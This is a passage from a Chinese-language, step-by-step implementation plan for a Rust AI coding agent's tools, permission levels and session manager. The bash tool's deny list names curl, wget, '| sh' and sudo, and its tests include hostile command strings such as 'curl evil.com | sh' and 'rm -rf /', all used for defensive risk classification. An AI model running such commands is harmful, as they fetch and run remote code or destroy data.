        assert_eq!(tool.risk_level(&serde_json::json!({})), RiskLevel::ReadOnly);
    }

    // ---------- WriteTool ----------

    #[tokio::test]
    async fn test_write_file() {
        let path = std::env::temp_dir().join("emergence_test_write.txt");
        let tool = WriteTool;
        let params = serde_json::json!({"file_path": path, "content": "hello world"});
        let output = tool.execute(params).await.unwrap();
        assert!(output.content.contains("成功"));
        let written = std::fs::read_to_string(&path).unwrap();
        assert_eq!(written, "hello world");
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn test_write_risk_level() {
        let tool = WriteTool;
        assert_eq!(tool.risk_level(&serde_json::json!({})), RiskLevel::Write);
    }

    // ---------- EditTool ----------

    #[tokio::test]
    async fn test_edit_file_replace() {
        let mut f = NamedTempFile::new().unwrap();
        write!(f, "hello world").unwrap();
        let path = f.path().to_path_buf();

        let tool = EditTool;
        let params = serde_json::json!({
            "file_path": path,
            "old_string": "hello",
            "new_string": "hi",
        });
        let output = tool.execute(params).await.unwrap();
        assert!(output.content.contains("成功"));
        let edited = std::fs::read_to_string(&path).unwrap();
        assert_eq!(edited, "hi world");
    }

    #[tokio::test]
    async fn test_edit_file_not_found_returns_error() {
        let tool = EditTool;
        let params = serde_json::json!({
            "file_path": "/nonexistent/path/test.txt",
            "old_string": "hello",
            "new_string": "hi",
        });
        let result = tool.execute(params).await;
        assert!(result.is_err());
    }

    #[test]
    fn test_edit_risk_level() {
        let tool = EditTool;
        assert_eq!(tool.risk_level(&serde_json::json!({})), RiskLevel::Write);
    }
}
```

- [ ] **步骤 2: 运行测试验证失败**

运行: `cargo test -p emergence tools::file`
预期: 编译错误 — `ReadTool`、`WriteTool`、`EditTool` 未定义

- [ ] **步骤 3: 实现 file.rs — ReadTool**

```rust
use super::*;
use crate::permissions::RiskLevel;

pub struct ReadTool;

#[async_trait::async_trait]
impl Tool for ReadTool {
    fn name(&self) -> &str { "read" }
    fn description(&self) -> &str { "读取文件内容，支持 offset/limit 分页" }

    fn parameters(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "file_path": { "type": "string", "description": "文件路径" },
                "offset": { "type": "integer", "description": "起始行 (0-indexed)", "default": 0 },
                "limit": { "type": "integer", "description": "读取行数，默认 2000" }
            },
            "required": ["file_path"]
        })
    }

    fn risk_level(&self, _params: &serde_json::Value) -> RiskLevel { RiskLevel::ReadOnly }

    async fn execute(&self, params: serde_json::Value) -> anyhow::Result<ToolOutput> {
        let file_path = params["file_path"].as_str()
            .ok_or_else(|| anyhow::anyhow!("缺少 file_path 参数"))?;
        let offset = params["offset"].as_u64().unwrap_or(0) as usize;
        let limit = params["limit"].as_u64().unwrap_or(2000) as usize;

        let content = std::fs::read_to_string(file_path)
            .map_err(|e| anyhow::anyhow!("读取文件失败: {}", e))?;
        let lines: Vec<&str> = content.lines().skip(offset).take(limit).collect();
        let result = lines.join("\n");

        Ok(ToolOutput {
            content: format!("{}(共 {} 行，显示第 {}-{} 行):\n{}",
                file_path,
                content.lines().count(),
                offset,
                offset + lines.len(),
                result,
            ),
            metadata: None,
        })
    }
}
```

- [ ] **步骤 4: 实现 file.rs — WriteTool**

```rust
pub struct WriteTool;

#[async_trait::async_trait]
impl Tool for WriteTool {
    fn name(&self) -> &str { "write" }
    fn description(&self) -> &str { "创建或覆盖文件" }

    fn parameters(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "file_path": { "type": "string", "description": "文件路径" },
                "content": { "type": "string", "description": "要写入的内容" }
            },
            "required": ["file_path", "content"]
        })
    }

    fn risk_level(&self, _params: &serde_json::Value) -> RiskLevel { RiskLevel::Write }

    async fn execute(&self, params: serde_json::Value) -> anyhow::Result<ToolOutput> {
        let file_path = params["file_path"].as_str()
            .ok_or_else(|| anyhow::anyhow!("缺少 file_path 参数"))?;
        let content = params["content"].as_str()
            .ok_or_else(|| anyhow::anyhow!("缺少 content 参数"))?;

        if let Some(parent) = std::path::Path::new(file_path).parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::write(file_path, content)?;
        let size = content.len();

        Ok(ToolOutput {
            content: format!("成功写入 {} ({} 字节)", file_path, size),
            metadata: Some(serde_json::json!({"byte_count": size})),
        })
    }
}
```

- [ ] **步骤 5: 实现 file.rs — EditTool**

```rust
pub struct EditTool;

#[async_trait::async_trait]
impl Tool for EditTool {
    fn name(&self) -> &str { "edit" }
    fn description(&self) -> &str { "精确字符串替换——在文件中查找 old_string 并替换为 new_string" }

    fn parameters(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "file_path": { "type": "string", "description": "文件路径" },
                "old_string": { "type": "string", "description": "要替换的文本（必须精确匹配且唯一）" },
                "new_string": { "type": "string", "description": "替换后的文本" }
            },
            "required": ["file_path", "old_string", "new_string"]
        })
    }

    fn risk_level(&self, _params: &serde_json::Value) -> RiskLevel { RiskLevel::Write }

    async fn execute(&self, params: serde_json::Value) -> anyhow::Result<ToolOutput> {
        let file_path = params["file_path"].as_str()
            .ok_or_else(|| anyhow::anyhow!("缺少 file_path 参数"))?;
        let old_string = params["old_string"].as_str()
            .ok_or_else(|| anyhow::anyhow!("缺少 old_string 参数"))?;
        let new_string = params["new_string"].as_str()
            .ok_or_else(|| anyhow::anyhow!("缺少 new_string 参数"))?;

        if old_string == new_string {
            return Ok(ToolOutput {
                content: "old_string 和 new_string 相同，无需修改".into(),
                metadata: None,
            });
        }

        let content = std::fs::read_to_string(file_path)
            .map_err(|e| anyhow::anyhow!("读取文件失败: {}", e))?;

        let count = content.matches(old_string).count();
        if count == 0 {
            anyhow::bail!("未找到匹配的文本: {}", old_string);
        }
        if count > 1 {
            anyhow::bail!("找到 {} 处匹配，old_string 必须唯一。请在 old_string 前后添加更多上下文。", count);
        }

        let edited = content.replacen(old_string, new_string, 1);
        std::fs::write(file_path, &edited)?;

        Ok(ToolOutput {
            content: format!("成功替换 {} 中的 1 处匹配", file_path),
            metadata: Some(serde_json::json!({"replacements": 1})),
        })
    }
}
```

- [ ] **步骤 6: 更新 src/tools/mod.rs 添加 file 模块**

在 mod.rs 末尾添加：
```rust
pub mod file;
```

- [ ] **步骤 7: 运行测试**

运行: `cargo test -p emergence tools::file`
预期: 所有测试通过

- [ ] **步骤 8: 提交**

```bash
git add src/tools/file.rs src/tools/mod.rs
git commit -m "feat: 实现文件工具 — ReadTool、WriteTool、EditTool"
```

---

### 任务 9: 搜索工具 — grep、glob

**文件:**
- 创建: `src/tools/search.rs`
- 修改: `src/tools/mod.rs`

- [ ] **步骤 1: 编写 search.rs 测试和实现**

```rust
use super::*;
use crate::permissions::RiskLevel;
use std::process::Command;

pub struct GrepTool;

#[async_trait::async_trait]
impl Tool for GrepTool {
    fn name(&self) -> &str { "grep" }
    fn description(&self) -> &str { "在文件中搜索文本模式" }

    fn parameters(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "pattern": { "type": "string", "description": "搜索模式（支持正则）" },
                "path": { "type": "string", "description": "搜索路径，默认当前目录", "default": "." },
                "include": { "type": "string", "description": "文件过滤 glob，如 '*.rs'" },
            },
            "required": ["pattern"]
        })
    }

    fn risk_level(&self, _params: &serde_json::Value) -> RiskLevel { RiskLevel::ReadOnly }

    async fn execute(&self, params: serde_json::Value) -> anyhow::Result<ToolOutput> {
        let pattern = params["pattern"].as_str()
            .ok_or_else(|| anyhow::anyhow!("缺少 pattern 参数"))?;
        let path = params["path"].as_str().unwrap_or(".");
        let include = params["include"].as_str();

        let mut cmd = Command::new("grep");
        cmd.arg("-rn").arg("-I").arg("--color=never");
        cmd.arg(pattern).arg(path);

        // 排除隐藏目录
        cmd.arg("--exclude-dir=.git");
        cmd.arg("--exclude-dir=.emergence");
        cmd.arg("--exclude-dir=target");
        cmd.arg("--exclude-dir=node_modules");

        if let Some(glob) = include {
            cmd.arg("--include").arg(glob);
        }

        let output = cmd.output().map_err(|e| anyhow::anyhow!("grep 执行失败: {}", e))?;
        let stdout = String::from_utf8_lossy(&output.stdout);

        let result = if stdout.trim().is_empty() {
            "未找到匹配结果".to_string()
        } else if stdout.lines().count() > 500 {
            let limited: Vec<&str> = stdout.lines().take(500).collect();
            format!("{}(... 截断，共 {} 行，显示前 500 行)", limited.join("\n"), stdout.lines().count())
        } else {
            stdout.to_string()
        };

        Ok(ToolOutput {
            content: result,
            metadata: Some(serde_json::json!({"match_count": stdout.lines().count()})),
        })
    }
}

pub struct GlobTool;

#[async_trait::async_trait]
impl Tool for GlobTool {
    fn name(&self) -> &str { "glob" }
    fn description(&self) -> &str { "按文件模式匹配查找文件" }

    fn parameters(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "pattern": { "type": "string", "description": "文件 glob 模式，如 'src/**/*.rs'" },
                "path": { "type": "string", "description": "搜索路径，默认当前目录", "default": "." }
            },
            "required": ["pattern"]
        })
    }

    fn risk_level(&self, _params: &serde_json::Value) -> RiskLevel { RiskLevel::ReadOnly }

    async fn execute(&self, params: serde_json::Value) -> anyhow::Result<ToolOutput> {
        let pattern = params["pattern"].as_str()
            .ok_or_else(|| anyhow::anyhow!("缺少 pattern 参数"))?;
        let path = params["path"].as_str().unwrap_or(".");

        let output = Command::new("find")
            .arg(path)
            .arg("-path")
            .arg(pattern)
            .arg("-not")
            .arg("-path")
            .arg("*/.*")
            .arg("-not")
            .arg("-path")
            .arg("*/target/*")
            .arg("-not")
            .arg("-path")
            .arg("*/node_modules/*")
            .output()
            .map_err(|e| anyhow::anyhow!("find 执行失败: {}", e))?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        let result = if stdout.trim().is_empty() {
            "未找到匹配文件".to_string()
        } else {
            stdout.to_string()
        };

        Ok(ToolOutput {
            content: result,
            metadata: Some(serde_json::json!({"file_count": stdout.lines().count()})),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_grep_parameters() {
        let tool = GrepTool;
        let params = tool.parameters();
        assert!(params["required"].as_array().unwrap().contains(&serde_json::json!("pattern")));
    }

    #[test]
    fn test_grep_risk_level() {
        assert_eq!(GrepTool.risk_level(&serde_json::json!({})), RiskLevel::ReadOnly);
    }

    #[test]
    fn test_glob_risk_level() {
        assert_eq!(GlobTool.risk_level(&serde_json::json!({})), RiskLevel::ReadOnly);
    }

    #[tokio::test]
    async fn test_glob_finds_files() {
        let tool = GlobTool;
        let params = serde_json::json!({"pattern": "src/main.rs", "path": "."});
        let output = tool.execute(params).await.unwrap();
        assert!(output.content.contains("main.rs"));
    }
}
```

- [ ] **步骤 2: 更新 src/tools/mod.rs 添加 search 模块**

在 mod.rs 末尾添加：
```rust
pub mod search;
```

- [ ] **步骤 3: 运行测试**

运行: `cargo test -p emergence tools::search`
预期: 测试通过

- [ ] **步骤 4: 提交**

```bash
git add src/tools/search.rs src/tools/mod.rs
git commit -m "feat: 实现搜索工具 — GrepTool、GlobTool"
```

---

### 任务 10: Bash 工具

**文件:**
- 创建: `src/tools/bash.rs`
- 修改: `src/tools/mod.rs`

- [ ] **步骤 1: 编写 Bash 工具（含风险分类）**

```rust
use super::*;
use crate::permissions::RiskLevel;
use std::process::Command;

pub struct BashTool;

impl BashTool {
    /// 危险命令模式匹配 — 返回 System 级别风险
    const DANGEROUS_PATTERNS: &[&str] = &[
        "rm ", "rmdir", "mv ", "/dev/sd", "/dev/hd",
        "mkfs", "dd ", "mkswap", "swapon",
        "chmod ", "chown ", "sudo ",
        "> /dev/", "> /proc/", "| sh", "| bash",
        "curl", "wget",
        "passwd", "useradd", "usermod",
        "systemctl", "service ",
        "kill ", "killall",
        "reboot", "shutdown", "halt", "poweroff",
        "iptables", "firewall",
        "mount ", "umount ",
        "docker ", "podman ",
    ];

    /// 无害命令模式 — ReadOnly 级别
    const SAFE_PATTERNS: &[&str] = &[
        "ls", "cat", "head", "tail", "less", "more",
        "echo", "printf", "pwd", "whoami", "date", "env",
        "which", "whereis", "type", "man", "info",
        "wc", "sort", "uniq", "cut", "tr", "column",
        "find ", "locate ", "du ", "df ", "free ", "ps ", "top ",
        "git log", "git diff", "git status", "git branch",
        "git show", "git config --list",
        "cargo check", "cargo test", "cargo doc",
        "npm ls", "npm list",
        "tree ", "file ",
    ];

    fn classify_command(command: &str) -> RiskLevel {
        let trimmed = command.trim();

        // 先检查危险模式
        for pattern in Self::DANGEROUS_PATTERNS {
            if trimmed.contains(pattern) {
                return RiskLevel::System;
            }
        }

        // 再检查安全模式
        for pattern in Self::SAFE_PATTERNS {
            if trimmed.starts_with(pattern) {
                return RiskLevel::ReadOnly;
            }
        }

        // 默认为 Write 级别（如 cargo build 等）
        RiskLevel::Write
    }
}

#[async_trait::async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str { "bash" }

    fn description(&self) -> &str {
        "在 shell 中执行命令。只读命令自动放行，写命令需确认，危险命令需显式授权。"
    }

    fn parameters(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": { "type": "string", "description": "要执行的 shell 命令" },
                "timeout_ms": { "type": "integer", "description": "超时时间（毫秒），默认 120000", "default": 120000 }
            },
            "required": ["command"]
        })
    }

    fn risk_level(&self, params: &serde_json::Value) -> RiskLevel {
        let command = params["command"].as_str().unwrap_or("");
        Self::classify_command(command)
    }

    async fn execute(&self, params: serde_json::Value) -> anyhow::Result<ToolOutput> {
        let command = params["command"].as_str()
            .ok_or_else(|| anyhow::anyhow!("缺少 command 参数"))?;
        let timeout_ms = params["timeout_ms"].as_u64().unwrap_or(120000);

        let output = tokio::time::timeout(
            std::time::Duration::from_millis(timeout_ms),
            tokio::task::spawn_blocking({
                let cmd = command.to_string();
                move || -> std::io::Result<std::process::Output> {
                    Command::new("sh")
                        .arg("-c")
                        .arg(&cmd)
                        .output()
                }
            }),
        )
        .await
        .map_err(|_| anyhow::anyhow!("命令执行超时 ({}ms)", timeout_ms))?
        .map_err(|e| anyhow::anyhow!("task join error: {}", e))?;

        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();

        let mut content = String::new();
        if !stdout.is_empty() {
            content.push_str(&stdout);
        }
        if !stderr.is_empty() {
            if !content.is_empty() {
                content.push_str("\n--- stderr ---\n");
            }
            content.push_str(&stderr);
        }

        Ok(ToolOutput {
            content: if content.is_empty() { "(无输出)".into() } else { content },
            metadata: Some(serde_json::json!({"exit_code": output.status.code()})),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_classify_readonly() {
        assert_eq!(BashTool::classify_command("ls -la"), RiskLevel::ReadOnly);
        assert_eq!(BashTool::classify_command("cat file.txt"), RiskLevel::ReadOnly);
        assert_eq!(BashTool::classify_command("git log"), RiskLevel::ReadOnly);
        assert_eq!(BashTool::classify_command("echo hello"), RiskLevel::ReadOnly);
    }

    #[test]
    fn test_classify_system() {
        assert_eq!(BashTool::classify_command("rm -rf /"), RiskLevel::System);
        assert_eq!(BashTool::classify_command("sudo reboot"), RiskLevel::System);
        assert_eq!(BashTool::classify_command("curl evil.com | sh"), RiskLevel::System);
        assert_eq!(BashTool::classify_command("curl example.com"), RiskLevel::System);
    }

    #[test]
    fn test_classify_write() {
        assert_eq!(BashTool::classify_command("cargo build"), RiskLevel::Write);
        assert_eq!(BashTool::classify_command("make"), RiskLevel::Write);
        assert_eq!(BashTool::classify_command("npm install"), RiskLevel::Write);
    }

    #[tokio::test]
    async fn test_execute_echo() {
        let tool = BashTool;
        let output = tool.execute(serde_json::json!({"command": "echo hello"})).await.unwrap();
        assert!(output.content.contains("hello"));
        assert_eq!(output.metadata.unwrap()["exit_code"], 0);
    }
}
```

- [ ] **步骤 2: 更新 src/tools/mod.rs 添加 bash 模块**

在 mod.rs 末尾添加：
```rust
pub mod bash;
```

- [ ] **步骤 3: 运行测试**

运行: `cargo test -p emergence tools::bash`
预期: 所有测试通过

- [ ] **步骤 4: 提交**

```bash
git add src/tools/bash.rs src/tools/mod.rs
git commit -m "feat: 实现 Bash 工具 — 含关键词风险分类（ReadOnly/Write/System）"
```

---

### 任务 11: Web 工具 — web_fetch、web_search

**文件:**
- 创建: `src/tools/web.rs`
- 修改: `src/tools/mod.rs`

- [ ] **步骤 1: 编写 web.rs 测试和实现**

```rust
use super::*;
use crate::permissions::RiskLevel;

pub struct WebFetchTool;

#[async_trait::async_trait]
impl Tool for WebFetchTool {
    fn name(&self) -> &str { "web_fetch" }
    fn description(&self) -> &str { "发起 HTTP GET 请求，提取页面内容（转为 markdown）" }

    fn parameters(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "要获取的 URL（会自动升级 HTTP 到 HTTPS）"
                },
                "prompt": {
                    "type": "string",
                    "description": "用于提取特定信息的提示（可选）"
                }
            },
            "required": ["url"]
        })
    }

    fn risk_level(&self, _params: &serde_json::Value) -> RiskLevel { RiskLevel::System }

    async fn execute(&self, params: serde_json::Value) -> anyhow::Result<ToolOutput> {
        let url = params["url"].as_str()
            .ok_or_else(|| anyhow::anyhow!("缺少 url 参数"))?;

        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(30))
            .user_agent("emergence/0.1.0")
            .build()?;

        let response = client.get(url).send().await
            .map_err(|e| anyhow::anyhow!("HTTP 请求失败: {}", e))?;

        let status = response.status();
        let body = response.text().await?;

        // 简单 HTML → text：去除所有 HTML 标签
        let text = strip_html_tags(&body);

        Ok(ToolOutput {
            content: format!("状态码: {}\n\n{}",
                status,
                if text.len() > 10000 { format!("{}...(截断)", &text[..10000]) } else { text }
            ),
            metadata: Some(serde_json::json!({
                "status_code": status.as_u16(),
                "content_length": body.len(),
            })),
        })
    }
}

fn strip_html_tags(html: &str) -> String {
    let re = regex::Regex::new(r"<[^>]*>").unwrap();
    let text = re.replace_all(html, "");
    let text = text.replace("&nbsp;", " ").replace("&amp;", "&")
        .replace("&lt;", "<").replace("&gt;", ">")
        .replace("&quot;", "\"");
    // 合并多余空白
    let re_ws = regex::Regex::new(r"\n\s*\n").unwrap();
    re_ws.replace_all(&text, "\n\n").trim().to_string()
}

pub struct WebSearchTool;

#[async_trait::async_trait]
impl Tool for WebSearchTool {
    fn name(&self) -> &str { "web_search" }
    fn description(&self) -> &str { "调用搜索 API 返回搜索结果" }

    fn parameters(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "query": { "type": "string", "description": "搜索查询词" }
            },
            "required": ["query"]
        })
    }

    fn risk_level(&self, _params: &serde_json::Value) -> RiskLevel { RiskLevel::System }

    async fn execute(&self, params: serde_json::Value) -> anyhow::Result<ToolOutput> {
        let query = params["query"].as_str()
            .ok_or_else(|| anyhow::anyhow!("缺少 query 参数"))?;

        // v1: 使用 DuckDuckGo HTML 重定向（无需 API key）
        let url = format!(
            "https://html.duckduckgo.com/html/?q={}",
            urlencoding::encode(query)
        );

        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(15))
            .user_agent("emergence/0.1.0")
            .build()?;

        let body = client.get(&url).send().await?.text().await?;

        // 简单提取搜索结果
        let results = extract_search_results(&body);

        Ok(ToolOutput {
            content: if results.is_empty() { "未找到结果".into() } else { results.join("\n\n") },
            metadata: Some(serde_json::json!({"result_count": results.len()})),
        })
    }
}

fn extract_search_results(html: &str) -> Vec<String> {
    let mut results = Vec::new();
    // 简单解析 DuckDuckGo HTML 结果
    let re_link = regex::Regex::new(r#"<a[^>]*class="result__a"[^>]*href="([^"]*)"[^>]*>([^<]*)</a>"#).unwrap();
    let re_snippet = regex::Regex::new(r#"<a[^>]*class="result__snippet"[^>]*>([^<]*(?:<[^/][^>]*>[^<]*</[^>]*>[^<]*)*)</a>"#).unwrap();

    // 简化：直接提取标题+链接
    for cap in re_link.captures_iter(html).take(10) {
        let url = html_escape::decode_html_entities(&cap[1]).to_string();
        let title = html_escape::decode_html_entities(&cap[2]).to_string();
        results.push(format!("- [{}]({})", title.trim(), url.trim()));
    }

    results
}

// 需要在 Cargo.toml 中添加 urlencoding 和 html_escape 依赖
// urlencoding = "2"
// html_escape = "0.2"

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_strip_html_tags() {
        let html = "<html><body><p>Hello</p><p>World</p></body></html>";
        let text = strip_html_tags(html);
        assert!(text.contains("Hello"));
        assert!(text.contains("World"));
    }

    #[test]
    fn test_web_fetch_risk() {
        assert_eq!(
            WebFetchTool.risk_level(&serde_json::json!({})),
            RiskLevel::System
        );
    }

    #[test]
    fn test_web_search_risk() {
        assert_eq!(
            WebSearchTool.risk_level(&serde_json::json!({})),
            RiskLevel::System
        );
    }
}
```

- [ ] **步骤 2: 更新 Cargo.toml 添加依赖**

在 `[dependencies]` 中添加：
```toml
urlencoding = "2"
html_escape = "0.2"
```

- [ ] **步骤 3: 更新 src/tools/mod.rs 添加 web 模块**

在 mod.rs 末尾添加：
```rust
pub mod web;
```

- [ ] **步骤 4: 运行测试**

运行: `cargo test -p emergence tools::web`
预期: 测试通过

- [ ] **步骤 5: 提交**

```bash
git add src/tools/web.rs src/tools/mod.rs Cargo.toml
git commit -m "feat: 实现 Web 工具 — WebFetchTool、WebSearchTool"
```

---

### 任务 12: 权限系统 — PermissionStore

**文件:**
- 修改: `src/permissions/mod.rs` (扩展)

- [ ] **步骤 1: 扩展 src/permissions/mod.rs 添加 PermissionStore**

完整替换 `src/permissions/mod.rs`：

```rust
use std::collections::HashSet;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum RiskLevel {
    ReadOnly,
    Write,
    System,
}

/// 用户对权限弹窗的选择
#[derive(Debug, Clone)]
pub enum UserChoice {
    ApproveOnce,
    ApproveAlways,
    Deny,
}

/// 会话级权限白名单
#[derive(Debug, Default)]
pub struct PermissionStore {
    /// (tool_name, RiskLevel) 的永久批准集合
    always_allow: HashSet<(String, RiskLevel)>,
}

impl PermissionStore {
    pub fn new() -> Self {
        Self {
            always_allow: HashSet::new(),
        }
    }

    /// 检查工具是否已批准
    pub fn is_allowed(&self, tool_name: &str, risk: RiskLevel) -> bool {
        self.always_allow.contains(&(tool_name.to_string(), risk))
    }

    /// 添加永久批准
    pub fn approve_always(&mut self, tool_name: &str, risk: RiskLevel) {
        self.always_allow.insert((tool_name.to_string(), risk));
    }

    /// 清空白名单（会话关闭时调用）
    pub fn clear(&mut self) {
        self.always_allow.clear();
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_allowed() {
        let mut store = PermissionStore::new();
        assert!(!store.is_allowed("bash", RiskLevel::Write));

        store.approve_always("bash", RiskLevel::Write);
        assert!(store.is_allowed("bash", RiskLevel::Write));
        assert!(!store.is_allowed("bash", RiskLevel::System));
    }

    #[test]
    fn test_clear() {
        let mut store = PermissionStore::new();
        store.approve_always("bash", RiskLevel::Write);
        assert!(store.is_allowed("bash", RiskLevel::Write));
        store.clear();
        assert!(!store.is_allowed("bash", RiskLevel::Write));
    }

    #[test]
    fn test_risk_level_ordering() {
        assert!(RiskLevel::ReadOnly < RiskLevel::Write);
        assert!(RiskLevel::Write < RiskLevel::System);
    }
}
```

- [ ] **步骤 2: 运行测试**

运行: `cargo test -p emergence permissions`
预期: 测试通过

- [ ] **步骤 3: 提交**

```bash
git add src/permissions/mod.rs
git commit -m "feat: 实现权限系统 — RiskLevel、PermissionStore 白名单、UserChoice"
```

---

### 任务 13: Session 类型与 SessionManager

**文件:**
- 创建: `src/session/mod.rs`

- [ ] **步骤 1: 编写 session 模块的类型和方法**

```rust
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use crate::llm::{ChatMessage, Usage};

/// 会话 ID
pub type SessionId = String;

/// Turn ID
pub type TurnId = String;

/// 会话查找键
#[derive(Debug, Clone)]
pub enum SessionKey {
    Id(SessionId),
    Alias(String),
}

/// 会话元信息（列表用，不含消息体）
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionMeta {
    pub id: SessionId,
    pub alias: Option<String>,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
    pub message_count: usize,
    pub summary: Option<String>,
}

/// Turn 状态
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TurnStatus {
    InProgress,
    Completed,
}

/// 一个对话轮次
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Turn {
    pub id: TurnId,
    pub messages: Vec<ChatMessage>,
    pub status: TurnStatus,
    pub started_at: DateTime<Utc>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub completed_at: Option<DateTime<Utc>>,
    pub usage: Usage,
}

/// 会话
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Session {
    pub id: SessionId,
    pub alias: Option<String>,
    pub turns: Vec<Turn>,
    pub summary: Option<String>,
    pub active_skills: Vec<String>,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

impl Session {
    pub fn new(id: SessionId) -> Self {
        let now = Utc::now();
        Self {
            id,
            alias: None,
            turns: Vec::new(),
            summary: None,
            active_skills: Vec::new(),
            created_at: now,
            updated_at: now,
        }
    }

    pub fn message_count(&self) -> usize {
        self.turns.iter().map(|t| t.messages.len()).sum()
    }
}

/// SessionManager — 管理会话生命周期
pub struct SessionManager {
    session: Session,
    turn_counter: usize,
}

impl SessionManager {
    pub fn new(session_id: SessionId) -> Self {
        Self {
            session: Session::new(session_id),
            turn_counter: 0,
        }
    }

    pub fn load(session: Session) -> Self {
        let turn_counter = session.turns.len();
        Self {
            session,
            turn_counter,
        }
    }

    pub fn current_turn(&self) -> Option<&Turn> {
        self.session.turns.last()
    }

    pub fn turns(&self) -> &[Turn] {
        &self.session.turns
    }

    pub fn session(&self) -> &Session {
        &self.session
    }

    pub fn session_mut(&mut self) -> &mut Session {
        &mut self.session
    }

    /// 开始新 Turn
    pub fn begin_turn(&mut self, user_message: ChatMessage) -> &Turn {
        self.turn_counter += 1;
        let turn = Turn {
            id: format!("turn-{}", self.turn_counter),
            messages: vec![user_message],
            status: TurnStatus::InProgress,
            started_at: Utc::now(),
            completed_at: None,
            usage: Usage::default(),
        };
        self.session.turns.push(turn);
        self.session.updated_at = Utc::now();
        self.session.turns.last().unwrap()
    }

    /// 向当前 Turn 追加消息
    pub fn push(&mut self, message: ChatMessage) -> anyhow::Result<()> {
        let turn = self.session.turns.last_mut()
            .ok_or_else(|| anyhow::anyhow!("没有进行中的 turn"))?;
        turn.messages.push(message);
        self.session.updated_at = Utc::now();
        Ok(())
    }

    /// 完成当前 Turn
    pub fn complete_turn(&mut self) -> anyhow::Result<()> {
        let turn = self.session.turns.last_mut()
            .ok_or_else(|| anyhow::anyhow!("没有进行中的 turn"))?;
        turn.status = TurnStatus::Completed;
        turn.completed_at = Some(Utc::now());
        self.session.updated_at = Utc::now();
        Ok(())
    }

    /// 构建发送给 LLM 的消息上下文（委托给 ContextBuilder）
    /// 完整实现见 src/session/context.rs
    pub fn build_context(
        &self,
        system_prompt: &str,
        tools: &[crate::llm::ToolDefinition],
        available_skills_text: &str,
        active_skill_contents: &[String],
        project_instructions: Option<&str>,
    ) -> Vec<ChatMessage> {
        crate::session::context::ContextBuilder::build(
            self.session(),
            system_prompt,
            tools,
            available_skills_text,
            active_skill_contents,
            project_instructions,
        )
    }

    /// 估算上下文 token 数（粗略：每字符 0.25 tokens）
    pub fn estimated_tokens(&self) -> u32 {
        let char_count: usize = self.session.turns.iter()
            .flat_map(|t| t.messages.iter())
            .map(|m| match &m.content {
                crate::llm::Content::Text(t) => t.len(),
                crate::llm::Content::Parts(parts) => parts.iter()
                    .map(|p| match p {
                        crate::llm::ContentPart::Text { text } => text.len(),
                        crate::llm::ContentPart::ToolUse { input, .. } => input.to_string().len(),
                        crate::llm::ContentPart::ToolResult { content, .. } => content.len(),
                    })
                    .sum(),
            })
            .sum();
        // 粗略比例
        (char_count as f32 * 0.25) as u32
    }

    /// 判断是否需要压缩
    pub fn should_compact(&self, threshold: u32) -> bool {
        self.estimated_tokens() > ((threshold as f32) * 0.8) as u32
    }

    /// 执行 compaction（保留最近 keep_recent 个 Turn，其余转为摘要）
    pub fn compact(&mut self, keep_recent: usize) {
        crate::session::context::ContextBuilder::compact(&mut self.session, keep_recent);
    }

    /// 清除所有消息（/clear 命令）
    pub fn clear(&mut self) {
        self.session.turns.clear();
        self.session.summary = None;
        self.turn_counter = 0;
    }

    /// 设置别名
    pub fn set_alias(&mut self, alias: String) {
        self.session.alias = Some(alias);
    }

    // Skill 管理 (§8)
    pub fn activate_skill(&mut self, name: &str) -> anyhow::Result<()> {
        if !self.session.active_skills.contains(&name.to_string()) {
            self.session.active_skills.push(name.to_string());
        }
        Ok(())
    }

    pub fn deactivate_skill(&mut self, name: &str) -> anyhow::Result<()> {
        self.session.active_skills.retain(|s| s != name);
        Ok(())
    }

    pub fn active_skills(&self) -> &[String] {
        &self.session.active_skills
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::llm::{Role, Content};

    fn make_user_msg(text: &str) -> ChatMessage {
        ChatMessage {
            role: Role::User,
            content: Content::Text(text.to_string()),
            name: None,
        }
    }

    #[test]
    fn test_begin_and_complete_turn() {
        let mut sm = SessionManager::new("test-1".into());

        sm.begin_turn(make_user_msg("hello"));
        assert_eq!(sm.turns().len(), 1);
        assert_eq!(sm.current_turn().unwrap().status, TurnStatus::InProgress);

        sm.complete_turn().unwrap();
        assert_eq!(sm.current_turn().unwrap().status, TurnStatus::Completed);
    }

    #[test]
    fn test_push_message() {
        let mut sm = SessionManager::new("test-2".into());
        sm.begin_turn(make_user_msg("hello"));
        sm.push(make_user_msg("world")).unwrap();
        assert_eq!(sm.current_turn().unwrap().messages.len(), 2);
    }

    #[test]
